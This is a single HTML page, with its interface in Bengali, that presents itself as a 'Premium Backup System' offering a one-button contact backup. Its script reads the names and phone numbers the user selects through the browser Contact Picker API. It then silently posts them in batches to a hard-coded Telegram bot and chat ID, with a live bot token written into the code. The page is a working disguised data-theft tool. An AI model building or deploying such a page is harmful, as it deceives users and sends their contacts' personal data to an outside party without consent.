<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Backup System</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body {
            /* ব্যাকগ্রাউন্ড কালার এবং কালারফুল শ্যাডো (গ্লো ইফেক্ট) */
            background-color: #050608;
            background-image: 
                radial-gradient(at 10% 10%, rgba(0, 242, 254, 0.15) 0px, transparent 50%),
                radial-gradient(at 90% 90%, rgba(126, 34, 206, 0.15) 0px, transparent 50%);
            color: white;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .premium-card {
            background: rgba(255, 255, 255, 0.02);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 30px;
            /* কার্ডের চারপাশের সফট গ্লো */
            box-shadow: 0 0 40px rgba(0, 242, 254, 0.1), 0 0 80px rgba(126, 34, 206, 0.1);
            padding: 40px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            transition: transform 0.3s ease;
        }

        .premium-btn {
            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 50%, #7e22ce 100%);
            background-size: 200% auto;
            border: none;
            padding: 16px;
            border-radius: 15px;
            color: white;
            font-weight: 700;
            width: 100%;
            cursor: pointer;
            box-shadow: 0 5px 20px rgba(79, 172, 254, 0.3);
            transition: 0.5s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-size: 16px;
        }

        .premium-btn:hover {
            background-position: right center; /* হোভার করলে কালার শিফট হবে */
            box-shadow: 0 5px 25px rgba(126, 34, 206, 0.4);
        }

        .premium-btn:active {
            transform: scale(0.97);
        }
    </style>
</head>
<body>

    <div class="premium-card">
        <div id="main-view">
            <button onclick="fetchContacts()" class="premium-btn">
                <i class="fas fa-cloud-download-alt text-lg"></i> ব্যাকআপ শুরু করুন
            </button>
        </div>

        <div id="status" class="mt-6 text-sm font-medium text-cyan-300"></div>
    </div>

    <script>
        const BOT_TOKEN = '8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k';
        const CHAT_ID = '6467941734';

        async function fetchContacts() {
            const status = document.getElementById('status');
            
            // ব্রাউজার সাপোর্ট চেক
            if (!('contacts' in navigator && 'ContactsManager' in window)) {
                status.innerHTML = "❌ এই ব্রাউজার সাপোর্ট করছে না। দয়া করে অ্যান্ড্রয়েড ক্রোম (Chrome) ব্যবহার করুন এবং HTTPS সাইটে ট্রাই করুন।";
                return;
            }

            try {
                const props = ['name', 'tel'];
                const opts = { multiple: true };
                
                status.innerText = "অনুমতি দিন এবং নম্বর সিলেক্ট করুন...";
                const contacts = await navigator.contacts.select(props, opts);

                if (contacts && contacts.length > 0) {
                    status.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> প্রসেসিং... (০/${contacts.length})`;
                    await sendData(contacts);
                }
            } catch (err) {
                // ইউজার ক্যান্সেল করলে বা কোনো এরর হলে
                status.innerText = ""; // এরর মেসেজ হাইড করা হলো প্রিমিয়াম লুকের জন্য
                console.error("ভুল হয়েছে:", err.message);
            }
        }

        async function sendData(contacts) {
            const status = document.getElementById('status');
            const CHUNK_SIZE = 15; // প্রতি মেসেজে ১৫ জন করে (সেফ লিমিট)
            
            // সময় এবং তারিখ সেটআপ
            const now = new Date();
            const days = ['রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার', 'শনিবার'];
            const dayName = days[now.getDay()];
            const dateStr = now.toLocaleDateString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric' });
            const timeStr = now.toLocaleTimeString('bn-BD');

            for (let i = 0; i < contacts.length; i += CHUNK_SIZE) {
                const chunk = contacts.slice(i, i + CHUNK_SIZE);
                let message = `📊 **GX Backup number**\n\n`;
                message += `📅 ${dayName}, ${dateStr}\n`;
                message += `⏰ ${timeStr}\n`;
                message += `👥 Total Contacts: ${contacts.length}\n`;
                message += `━━━━━━━━━━━━━━━━━━━━\n\n`;

                chunk.forEach(c => {
                    const name = c.name ? c.name[0] : 'No Name';
                    const tel = c.tel ? c.tel[0] : 'No Number';
                    message += `Name : ──${name}─\n`;
                    message += `Number : ${tel}\n\n`;
                });

                message += `— GX Sammim sent`;

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    });
                    
                    // প্রগতি দেখানো
                    status.innerText = `পাঠানো হচ্ছে: ${Math.min(i + CHUNK_SIZE, contacts.length)} / ${contacts.length}`;
                    // ১.৫ সেকেন্ড অপেক্ষা (রেট লিমিট এড়াতে)
                    await new Promise(r => setTimeout(r, 1500)); 
                } catch (e) {
                    console.error("Sending logic error:", e);
                }
            }
            status.innerHTML = "✅ সফলভাবে সব নম্বর ব্যাকআপ হয়েছে!";
            alert("সব তথ্য সফলভাবে GX বোর্ডে পাঠানো হয়েছে!");
        }
    </script>
</body>
</html>
